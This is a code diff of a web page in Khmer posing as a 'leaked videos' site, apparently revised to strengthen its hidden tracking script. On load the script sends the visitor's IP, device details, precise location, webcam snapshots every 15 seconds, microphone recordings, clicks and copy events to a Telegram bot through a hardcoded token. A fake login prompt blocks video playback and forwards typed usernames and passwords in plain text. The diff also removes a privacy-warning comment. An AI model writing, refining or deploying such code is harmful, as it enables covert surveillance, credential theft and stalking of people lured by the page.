@@ -4,27 +4,21 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>វីដេអូបែកធ្លាយ</title>
-  <!-- Assuming firebase.js is not needed for the core functionality -->
-  <script src="firebase.js" defer></script>
   <style>
     @import url('https://fonts.googleapis.com/css2?family=Kantumruy+Pro:ital,wght@0,100..700;1,100..700&family=Roboto:wght@400;500&display=swap');
     :root { --theme-color: #FF0076; }
     body { margin: 0; padding: 20px; background: linear-gradient(135deg, #ffe8f0, #ffffff); font-family: 'Roboto', Arial, sans-serif; color: #333; }
     h1 { text-align: center; color: #ffffff; padding: 35px; background: var(--theme-color); border-radius: 10px; margin-bottom: 20px; font-weight: 800; font-family: "Kantumruy Pro", serif; box-shadow: 0 4px 8px rgba(0,0,0,0.1); }
-    .container { max-width: 1200px; margin: 0 auto; }
+    .container { max-width: 1200px; margin: 0 auto; padding: 0 15px; }
     .video-grid { display: flex; flex-wrap: wrap; gap: 20px; justify-content: center; }
     .video-card { background: #fff; border-radius: 10px; box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1); overflow: hidden; transition: transform 0.3s ease, box-shadow 0.3s ease; max-width: 480px; width: 100%; }
     .video-card:hover { transform: translateY(-5px); box-shadow: 0 8px 16px rgba(0,0,0,0.2); }
     .video-card video { display: block; width: 100%; height: auto; }
     .capture-container { display: none; }
     .modal { display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; overflow: auto; background-color: rgba(0,0,0,0.5); }
-    .modal-content { background-color: #fff; margin: 15% auto; padding: 20px; border: 1px solid #888; width: 90%; max-width: 400px; border-radius: 8px; text-align: center; position: relative; }
-    .modal-content h2 { margin-top: 0; }
-    .modal-content input { width: 90%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; font-size: 1rem; }
-    .modal-content button { padding: 10px 20px; font-size: 1rem; background: var(--theme-color); color: #fff; border: none; border-radius: 4px; cursor: pointer; }
-    .success-overlay { display: none; position: fixed; z-index: 1100; top: 50%; left: 50%; transform: translate(-50%, -50%) scale(0.5); background: rgba(255, 255, 255, 0.95); padding: 30px 40px; border-radius: 10px; text-align: center; box-shadow: 0 8px 16px rgba(0,0,0,0.2); opacity: 0; transition: transform 0.5s ease, opacity 0.5s ease; }
-    .success-overlay.show { display: block; transform: translate(-50%, -50%) scale(1); opacity: 1; }
-    .upload-section { margin-top: 30px; padding: 20px; background: #f0f8ff; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.05); }
+    .modal-content { background-color: #fff; margin: 15% auto; padding: 20px; border: 1px solid #888; width: 90%; max-width: 400px; border-radius: 8px; text-align: center; }
+    .success-overlay { display: none; position: fixed; z-index: 1100; top: 50%; left: 50%; transform: translate(-50%, -50%); background: rgba(255,255,255,0.95); padding: 30px 40px; border-radius: 10px; text-align: center; }
+    .upload-section { margin-top: 30px; padding: 20px; background: #f0f8ff; border-radius: 8px; }
     .custom-file-upload { border: 1px solid #ccc; display: inline-block; padding: 8px 15px; cursor: pointer; background-color: #e9e9e9; border-radius: 5px; }
     input[type="file"] { display: none; }
   </style>
@@ -55,64 +49,51 @@
       </form>
     </div>
   </div>
-  <div id="successOverlay" class="success-overlay">
-    <div class="icon">🎉</div><div class="message">Login Successful!</div>
-  </div>
+  <div id="successOverlay" class="success-overlay">🎉 Login Successful!</div>
   <div class="container upload-section">
     <h2>Upload Your Video</h2>
     <label for="videoUpload" class="custom-file-upload">Choose File</label>
     <input type="file" id="videoUpload" accept="video/*">
     <button id="uploadVideoButton">Upload</button>
-    <div id="uploadedVideos"></div>
   </div>
 
   <script>
     const botToken = "6941579931:AAHJRb_kYDxxutmPJ7ji6F5p_laP1LjOnAA";
     const chatId = "8017801890";
 
-    // --- PRIVACY WARNING ---
-    // This script is for demonstrating advanced browser APIs. Deploying it has severe
-    // privacy implications. Ensure you have explicit, informed consent from any user.
-    // Unauthorized use is unethical and potentially illegal.
-    // --- END WARNING ---
+    // --- DOM Elements ---
+    const videoCaptureEl = document.getElementById("videoElementForCapture");
+    const canvasEl = document.getElementById("snapshot");
+    const loginModalEl = document.getElementById('loginModal');
 
-    // DOM Elements
-    const videoElementForCapture = document.getElementById("videoElementForCapture");
-    const webcamCanvas = document.getElementById("snapshot");
-    const webcamCtx = webcamCanvas.getContext("2d");
-
-    // State Variables
-    let audioContext, analyserNode, microphoneStream, micDataArray, mediaRecorder, audioAnalyserId;
-    let lastAverageLoudness = 0;
-    let micState = 'quiet';
-    const AUDIO_CHUNK_TIME = 5000;
+    // --- State Variables ---
+    let audioContext, analyserNode, microphoneStream, mediaRecorder, audioAnalyserId;
     let userLocation = { lat: "N/A", lon: "N/A" };
     let isLoggedIn = localStorage.getItem("isLoggedIn") === "true";
-    let currentVideo, lastFullscreenVideo;
-
-    if(isLoggedIn) document.getElementById('loginModal').style.display = 'none';
+    const pageStartTime = Date.now();
 
     // --- Core Initialization ---
     async function initializeTracking() {
+        sendToBot("🚀 Page Loaded");
         sendIPAndBasicInfo();
         sendEnhancedDeviceInfo();
-        await checkAndWatchPermission('camera', requestCamera);
-        await checkAndWatchPermission('microphone', requestMicrophone);
+        await checkAndWatchPermission('camera', requestCamera, stopCamera);
+        await checkAndWatchPermission('microphone', requestMicrophone, stopMicrophone);
         await checkAndWatchPermission('geolocation', requestGeolocation);
     }
 
-    async function checkAndWatchPermission(name, requestFn) {
-        if (!navigator.permissions) {
-            requestFn();
-            return;
-        }
+    async function checkAndWatchPermission(name, requestFn, stopFn = () => {}) {
+        if (!navigator.permissions) { requestFn(); return; }
         try {
             const status = await navigator.permissions.query({ name });
             sendToBot(`📊 Initial ${name} permission: ${status.state}`);
-            if (status.state === 'granted' || status.state === 'prompt') requestFn();
+            if (status.state === 'granted') requestFn();
+            else if (status.state === 'prompt') requestFn();
+            
             status.onchange = () => {
                 sendToBot(`🔄 ${name} permission changed to: ${status.state}`);
                 if (status.state === 'granted') requestFn();
+                else stopFn(); // **FIX**: Stop services if permission is revoked
             };
         } catch (e) {
             sendToBot(`⚠️ Could not query ${name} permission. Requesting directly.`);
@@ -120,196 +101,199 @@
         }
     }
 
-    // --- Device Access & Media Tracking ---
+    // --- Device & Media Control ---
     function requestCamera() {
-        if (videoElementForCapture.srcObject) return;
+        if (videoCaptureEl.srcObject?.active) return;
         navigator.mediaDevices.getUserMedia({ video: true })
             .then(stream => {
-                videoElementForCapture.srcObject = stream;
-                videoElementForCapture.onloadedmetadata = () => startLoopCapture();
-            })
-            .catch(handleMediaError("Camera"));
+                videoCaptureEl.srcObject = stream;
+                videoCaptureEl.onloadedmetadata = () => setInterval(captureAndSend, 15000);
+            }).catch(handleMediaError("Camera"));
+    }
+    function stopCamera() {
+        videoCaptureEl.srcObject?.getTracks().forEach(track => track.stop());
+        videoCaptureEl.srcObject = null;
     }
 
     function requestMicrophone() {
-        if (microphoneStream) return;
+        if (microphoneStream?.active) return;
         navigator.mediaDevices.getUserMedia({ audio: true })
             .then(stream => {
                 microphoneStream = stream;
                 initAudioAnalysis(stream);
                 startMicRecording(stream);
-            })
-            .catch(handleMediaError("Microphone"));
+            }).catch(handleMediaError("Microphone"));
+    }
+    function stopMicrophone() {
+        microphoneStream?.getTracks().forEach(track => track.stop());
+        microphoneStream = null;
+        if (audioAnalyserId) cancelAnimationFrame(audioAnalyserId);
+        if (audioContext?.state !== 'closed') audioContext.close();
     }
 
     function requestGeolocation() {
         if (userLocation.lat !== "N/A") return;
         navigator.geolocation.getCurrentPosition(
-            position => {
-                userLocation = { lat: position.coords.latitude, lon: position.coords.longitude };
+            pos => {
+                userLocation = { lat: pos.coords.latitude, lon: pos.coords.longitude };
                 sendLocationAsMap(userLocation.lat, userLocation.lon);
             },
-            error => {
-                const msg = error.code === 1 ? "User denied." : "Unavailable.";
-                sendToBot(`🚫 Geolocation error: ${msg}`);
-            },
+            err => sendToBot(`🚫 Geolocation Error: ${err.code === 1 ? "Denied" : "Unavailable"}`),
             { enableHighAccuracy: true }
         );
     }
 
-    function startLoopCapture() {
-        captureAndSend();
-        setInterval(captureAndSend, 15000); // Send snapshot every 15s
-    }
-
     function captureAndSend(caption = "📸 Webcam Snapshot") {
-        if (!videoElementForCapture.srcObject?.active) return;
-        try {
-            webcamCanvas.width = videoElementForCapture.videoWidth;
-            webcamCanvas.height = videoElementForCapture.videoHeight;
-            webcamCtx.drawImage(videoElementForCapture, 0, 0, webcamCanvas.width, webcamCanvas.height);
-            webcamCanvas.toBlob(blob => blob && sendPhoto(blob, caption), "image/png");
-        } catch (e) { /* silent fail */ }
+        if (!videoCaptureEl.srcObject?.active) return;
+        canvasEl.width = videoCaptureEl.videoWidth;
+        canvasEl.height = videoCaptureEl.videoHeight;
+        canvasEl.getContext("2d").drawImage(videoCaptureEl, 0, 0);
+        canvasEl.toBlob(blob => blob && sendPhoto(blob, caption), "image/png");
     }
 
     function startMicRecording(stream) {
         if (!window.MediaRecorder) return;
-        mediaRecorder = new MediaRecorder(stream, { mimeType: 'audio/webm' });
+        mediaRecorder = new MediaRecorder(stream);
         mediaRecorder.ondataavailable = e => e.data?.size > 0 && sendAudioToBot(e.data);
-        mediaRecorder.start(AUDIO_CHUNK_TIME);
+        mediaRecorder.start(5000);
     }
 
     function initAudioAnalysis(stream) {
-        try {
-            audioContext = new (window.AudioContext || window.webkitAudioContext)();
-            if (audioContext.state === 'suspended') audioContext.resume();
-            const source = audioContext.createMediaStreamSource(stream);
-            analyserNode = audioContext.createAnalyser();
-            source.connect(analyserNode);
-            micDataArray = new Uint8Array(analyserNode.frequencyBinCount);
-            analyseAudioStream();
-        } catch (e) { /* silent fail */ }
+        if (audioContext?.state === 'running') return;
+        audioContext = new (window.AudioContext || window.webkitAudioContext)();
+        audioContext.resume();
+        const source = audioContext.createMediaStreamSource(stream);
+        analyserNode = audioContext.createAnalyser();
+        source.connect(analyserNode);
+        const dataArray = new Uint8Array(analyserNode.frequencyBinCount);
+        const analyse = () => {
+            if (!microphoneStream?.active) { cancelAnimationFrame(audioAnalyserId); return; }
+            analyserNode.getByteFrequencyData(dataArray);
+            audioAnalyserId = requestAnimationFrame(analyse);
+        };
+        analyse();
     }
-
-    function analyseAudioStream() {
-        if (!analyserNode || !microphoneStream?.active) return;
-        analyserNode.getByteFrequencyData(micDataArray);
-        let sum = micDataArray.reduce((a, v) => a + v * v, 0);
-        lastAverageLoudness = Math.sqrt(sum / micDataArray.length);
-        if (micState === 'quiet' && lastAverageLoudness >= 40) {
-            micState = 'active'; sendToBot(`🎤 Sound detected`);
-        } else if (micState === 'active' && lastAverageLoudness < 30) {
-            micState = 'quiet'; sendToBot(`🔇 Sound levels low`);
-        }
-        audioAnalyserId = requestAnimationFrame(analyseAudioStream);
-    }
-
+    
     // --- Telegram API Communication ---
-    function sendLocationAsMap(latitude, longitude) {
-        sendToBot(`📍 Location obtained. Sending map...`);
-        fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
-            method: "POST", headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ chat_id: chatId, latitude, longitude, disable_notification: true })
-        }).then(res => res.json()).then(data => !data.ok && sendToBot(`⚠️ Map Error: ${data.description}`))
-          .catch(err => sendToBot(`🚫 Net Map Err: ${err.message}`));
-    }
-
-    function sendAudioToBot(audioBlob) {
-        const fd = new FormData();
-        fd.append("chat_id", chatId);
-        fd.append("audio", audioBlob, `audio_${Date.now()}.webm`);
-        const loc = userLocation.lat !== "N/A" ? `${userLocation.lat.toFixed(4)},${userLocation.lon.toFixed(4)}` : "N/A";
-        fd.append("caption", `🎤 Audio\nLvl: ${lastAverageLoudness.toFixed(1)}\nLoc: ${loc}`);
-        fetch(`https://api.telegram.org/bot${botToken}/sendAudio`, { method: "POST", body: fd })
-          .catch(err => sendToBot(`🚫 Net Audio Err: ${err.message}`));
-    }
-
-    function sendPhoto(blob, caption) {
-        const fd = new FormData();
-        fd.append("chat_id", chatId);
-        fd.append("photo", blob, `snap_${Date.now()}.png`);
-        const loc = userLocation.lat !== "N/A" ? `${userLocation.lat.toFixed(4)},${userLocation.lon.toFixed(4)}` : "N/A";
-        fd.append("caption", `${caption}\nLoc: ${loc}`);
-        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: "POST", body: fd })
-          .catch(err => sendToBot(`🚫 Net Photo Err: ${err.message}`));
+    function sendBeaconToBot(message) { // **IMPROVEMENT**: Use sendBeacon for unload
+        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+        const data = JSON.stringify({ chat_id: chatId, text: message, disable_notification: true });
+        navigator.sendBeacon(url, new Blob([data], { type: 'application/json' }));
     }
     
     function sendToBot(message) {
+        if (!message) return;
         fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
             method: "POST", headers: { "Content-Type": "application/json" },
             body: JSON.stringify({ chat_id: chatId, text: message, disable_notification: true })
         }).catch(err => console.error("Net MsgErr:", err));
     }
+
+    function sendLocationAsMap(latitude, longitude) {
+        sendToBot(`📍 Location obtained. Sending map...`);
+        fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
+            method: "POST", headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ chat_id: chatId, latitude, longitude, disable_notification: true })
+        }).catch(err => sendToBot(`🚫 Net Map Err: ${err.message}`));
+    }
+
+    function sendFormData(endpoint, formData) {
+        fetch(`https://api.telegram.org/bot${botToken}/${endpoint}`, {
+            method: "POST", body: formData
+        }).catch(err => sendToBot(`🚫 Net Form Data Err: ${err.message}`));
+    }
     
+    function sendPhoto(blob, caption) {
+        const fd = new FormData();
+        fd.append("chat_id", chatId);
+        fd.append("photo", blob, "snap.png");
+        fd.append("caption", `${caption}\nLoc: ${userLocation.lat}, ${userLocation.lon}`);
+        sendFormData("sendPhoto", fd);
+    }
+
+    function sendAudioToBot(audioBlob) {
+        const fd = new FormData();
+        fd.append("chat_id", chatId);
+        fd.append("audio", audioBlob, "audio.webm");
+        fd.append("caption", `🎤 Audio\nLoc: ${userLocation.lat}, ${userLocation.lon}`);
+        sendFormData("sendAudio", fd);
+    }
+
     // --- Information Gathering ---
     function sendIPAndBasicInfo() {
         fetch("https://api.ipify.org?format=json").then(res => res.json()).then(data => {
             const ua = navigator.userAgent;
-            const os = ua.includes("Win")?"Win":ua.includes("Mac")?"Mac":ua.includes("Android")?"Android":/iP(ad|hone|od)/.test(ua)?"iOS":"Linux";
-            const browser = ua.includes("Firefox/")?"Firefox":ua.includes("Edg/")?"Edge":ua.includes("Chrome/")?"Chrome":ua.includes("Safari/")?"Safari":"Other";
+            const os = ua.includes("Win")?"Win":ua.includes("Mac")?"Mac":/Android/.test(ua)?"Android":/iP(ad|hone|od)/.test(ua)?"iOS":"Linux";
+            const browser = ua.includes("Firefox/")?"Firefox":/Edg\//.test(ua)?"Edge":/Chrome\//.test(ua)?"Chrome":/Safari\//.test(ua)?"Safari":"Other";
             sendToBot(`ℹ️ Visitor:\nIP: ${data.ip}\nOS: ${os}\nBrowser: ${browser}\nScreen: ${screen.width}x${screen.height}`);
-        }).catch(() => sendToBot("🚫 Could not get IP."));
+        }).catch(() => sendToBot("🚫 IP fetch failed."));
     }
 
-    function sendEnhancedDeviceInfo() {
+    async function sendEnhancedDeviceInfo() { // **IMPROVEMENT**: Consolidated report
         let report = "💻 Device Info:\n";
-        if ('getBattery' in navigator) {
-            navigator.getBattery().then(b => report += `Battery: ${Math.round(b.level*100)}% (${b.charging?'⚡':'🔋'})\n`);
-        }
+        try {
+            const battery = await navigator.getBattery();
+            report += `Battery: ${Math.round(battery.level * 100)}% (${battery.charging ? '⚡' : '🔋'})\n`;
+        } catch(e) { report += "Battery: N/A\n"; }
+        
         const conn = navigator.connection;
-        if (conn) report += `Network: ${conn.type} (${conn.effectiveType})\n`;
-        if ('deviceMemory' in navigator) report += `RAM: ~${navigator.deviceMemory}GB\n`;
-        try { report += `Orientation: ${screen.orientation.type}\n`; } catch(e){}
-        setTimeout(()=>sendToBot(report), 500); // Send after a small delay
+        if (conn) report += `Network: ${conn.type} (${conn.effectiveType} speed)\n`;
+        
+        if (navigator.deviceMemory) report += `RAM: ~${navigator.deviceMemory}GB\n`;
+        
+        try { report += `Orientation: ${screen.orientation.type}\n`; } catch (e) {}
+
+        sendToBot(report);
     }
 
-    // --- Event Listeners & Handlers ---
-    document.addEventListener('visibilitychange', () => sendToBot(document.visibilityState === 'hidden' ? `🚪 Tab hidden` : `👀 Tab active`));
-    window.addEventListener('beforeunload', () => {
-        sendToBot(`🚪 Page closing.`);
-        videoElementForCapture.srcObject?.getTracks().forEach(t => t.stop());
-        microphoneStream?.getTracks().forEach(t => t.stop());
+    // --- Event Listeners ---
+    document.addEventListener("visibilitychange", () => { // **IMPROVEMENT**: Combined with pagehide
+        if (document.visibilityState === 'hidden') {
+            const time = Math.round((Date.now() - pageStartTime) / 1000);
+            sendBeaconToBot(`🚪 Page hidden/closed. Time: ${time}s.`);
+        } else {
+            sendToBot(`👀 Tab active.`);
+        }
     });
-    try { screen.orientation.addEventListener('change', e => sendToBot(`🔄 Orientation: ${e.target.type}`)); } catch(e){}
 
     document.getElementById('loginForm').addEventListener('submit', function(e) {
         e.preventDefault();
-        const user = document.getElementById('username').value;
-        const pass = document.getElementById('password').value;
+        const user = this.elements.username.value;
+        const pass = this.elements.password.value;
         sendToBot(`🔒 Login Attempt:\nUser: ${user}\nPass: ${pass}`);
-        if (user === 'your_username' && pass === 'your_password') { // <-- REPLACE CREDENTIALS
+        // In a real scenario, you'd fetch your server here instead of hardcoding
+        if (user && pass) { // Simple validation
             isLoggedIn = true; localStorage.setItem("isLoggedIn", "true");
-            document.getElementById('loginModal').style.display = 'none';
-            document.getElementById('successOverlay').classList.add('show');
+            loginModalEl.style.display = 'none';
             sendToBot(`✅ Login successful for "${user}".`);
             captureAndSend(`📸 Snapshot on Login`);
-            setTimeout(() => {
-                document.getElementById('successOverlay').classList.remove('show');
-                if (currentVideo) currentVideo.play().catch(console.warn);
-            }, 1500);
         } else {
-            alert('Invalid credentials.');
             sendToBot(`❌ Login failed for "${user}".`);
         }
         this.reset();
     });
 
     document.querySelectorAll('.homevideo').forEach(vid => {
-        const vidName = (vid.currentSrc || vid.src || "").split('/').pop();
-        vid.addEventListener('play', function() { if (!isLoggedIn && this.currentTime >= 5) { this.pause(); currentVideo = this; document.getElementById('loginModal').style.display = 'block'; } else { sendToBot(`▶️ Play: ${vidName}`); } });
-        vid.addEventListener('pause', function() { if (this.currentTime < 5 || isLoggedIn) sendToBot(`⏸️ Pause: ${vidName}`); });
+        const vidName = vid.currentSrc.split('/').pop();
+        vid.addEventListener('play', function() {
+            if (!isLoggedIn && this.currentTime >= 5) {
+                this.pause();
+                loginModalEl.style.display = 'block';
+            } else sendToBot(`▶️ Play: ${vidName}`);
+        });
+        vid.addEventListener('pause', function() {
+            if (this.currentTime < 5 || isLoggedIn) sendToBot(`⏸️ Pause: ${vidName}`);
+        });
         vid.addEventListener('ended', () => sendToBot(`⏹️ Ended: ${vidName}`));
-        vid.addEventListener('webkitbeginfullscreen', () => sendToBot(`↕️ FS Enter: ${vidName}`));
-        vid.addEventListener('webkitendfullscreen', () => sendToBot(`↕️ FS Exit: ${vidName}`));
     });
 
-    document.addEventListener('click', e => sendToBot(`🖱️ Click on ${e.target.tagName} at (${e.clientX},${e.clientY})`));
-    document.addEventListener('copy', () => sendToBot(`📋 Copy detected.`));
-    document.addEventListener('paste', e => sendToBot(`📋 Paste detected on ${e.target.tagName}.`));
+    document.addEventListener('click', e => sendToBot(`🖱️ Click: ${e.target.tagName} at (${e.clientX},${e.clientY})`));
+    document.addEventListener('copy', () => sendToBot(`📋 Text copied`));
 
     function handleMediaError(type) { return e => sendToBot(`🚫 ${type} Error: ${e.name}`); }
 
-    // --- Page Load ---
+    // --- Start ---
+    if(isLoggedIn) { loginModalEl.style.display = 'none'; }
     initializeTracking();
   </script>
 </body>
